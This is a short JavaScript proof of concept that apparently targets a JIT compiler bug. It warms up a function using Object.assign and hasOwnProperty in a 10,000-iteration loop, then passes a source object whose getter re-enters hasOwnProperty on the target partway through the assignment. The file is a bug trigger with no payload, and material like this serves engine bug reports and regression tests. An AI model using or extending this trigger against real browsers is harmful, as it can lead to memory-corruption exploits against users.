function poc(target, source) {
    Object.assign(target, source);
    target.hasOwnProperty('p1');
}

for (let i = 0; i < 10000; i++) {
    poc({
        p0: i
    }, {
        p1: i
    });
}

let trigger_obj = {};
let source_obj = {
    get p0() {
        Object.prototype.hasOwnProperty.call(trigger_obj, "foo");
        return 1;
    },
    p1: 2
};

poc(trigger_obj, source_obj);